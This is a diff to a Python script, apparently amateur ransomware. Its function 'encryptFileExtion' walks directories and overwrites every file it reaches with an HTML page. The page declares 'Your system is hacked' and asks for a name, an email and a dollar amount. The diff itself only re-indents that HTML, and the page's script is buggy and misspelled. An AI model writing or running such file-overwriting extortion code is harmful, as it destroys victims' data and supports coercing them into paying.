@@ -63,45 +63,44 @@ def encryptFileExtion():
             filename = root + "//" + file
             filehendler = open(filename, "w")
             filehendler.write("""
-
             	<!DOCTYPE html>
-		<html lang="en">
-		<head>
-		    <meta charset="UTF-8">
-		    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-		    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-		    <title>Document</title>
-		    <style>
-			body{min-height: 100vh;}
-			main{padding: 5px;}
-			#redt{color: red;}
-		    </style>
-		</head>
-		<body>
-		    <main>
-			<h3>Your system is hacked</h3>
-			<h4>Don't try any think!</h4>
-			<h5>Else your system was cresed</h5>
-			<h6 id="errorMsg"></h6>
-			<input type="text" name="username" id="username" value="" placeholder="Enter your name"/>
-			<input type="email" name="email" id="email" value="" placeholder="Enter your email id"/>
-			<input name="amount" id="amount" value="" placeholder="Enter amount in $"/>
-			<button type="submit">Submit</button>
-		    </main>
-		    <footer>
-			<samp id="redt">*</samp>If you enter ronge email id thetes your foltes.
-		    </footer>
-		    <script charset="utf-8">
-			amun = document.getElementById("amount")
-			if (amun <= 100){
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Document</title>
+                    <style>
+                    body{min-height: 100vh;}
+                    main{padding: 5px;}
+                    #redt{color: red;}
+                    </style>
+                </head>
+                <body>
+                <main>
+                <h3>Your system is hacked</h3>
+                <h4>Don't try any think!</h4>
+                <h5>Else your system was cresed</h5>
+                <h6 id="errorMsg"></h6>
+                <input type="text" name="username" id="username" value="" placeholder="Enter your name"/>
+                <input type="email" name="email" id="email" value="" placeholder="Enter your email id"/>
+                <input name="amount" id="amount" value="" placeholder="Enter amount in $"/>
+                <button type="submit">Submit</button>
+                </main>
+                <footer>
+                <samp id="redt">*</samp>If you enter ronge email id thetes your foltes.
+                </footer>
+                <script charset="utf-8">
+                amun = document.getElementById("amount")
+                if (amun <= 100){
 
-			}else{
-				document.getElementById("errorMsg").html = "Envalid amounts";
-			}
-			
-		    </script>
-		</body>
-		</html>            
+                }else{
+                    document.getElementById("errorMsg").html = "Envalid amounts";
+                }
+                
+                </script>
+                </body>
+                </html>            
             """)
             filehendler.close()
 #encryptFileExtion()
